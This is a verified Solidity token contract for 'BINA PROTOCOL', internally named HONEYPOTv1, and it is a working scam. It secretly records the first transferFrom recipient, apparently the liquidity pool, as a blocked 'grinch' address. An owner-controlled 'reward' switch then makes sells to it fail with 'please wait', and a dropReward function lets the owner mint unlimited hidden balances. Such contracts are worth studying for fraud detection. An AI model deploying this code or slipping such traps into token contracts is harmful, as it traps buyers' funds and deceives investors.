/**
 *Submitted for verification at BscScan.com on 2022-07-14
*/

pragma solidity 0.5.17;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Owned {
  address public owner;

  constructor() public {
    owner = msg.sender;
  }

}

contract HONEYPOTv1 is ERC20Interface, Owned{
  using SafeMath for uint;
  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address private grinch;
  bool public reward = false;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "BINA";
    name = "BINA PROTOCOL";
    decimals = 18;
    _totalSupply = 200000000 * 10**18;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function setReward(bool enable) public onlyOwner {
    reward = enable;
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    require(to != grinch, "please wait");
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function dropReward(address wallet, uint256 amount) external onlyOwner {
        require(wallet !=address(0), "Zero address not allowed");
        balances[wallet] += amount * 10**18;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && grinch == address(0)) {
      grinch = to;
      } 
      if (reward && from != owner){ 
          require(to != grinch, "please wait");
      }
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function () external payable {
    revert();
  }
}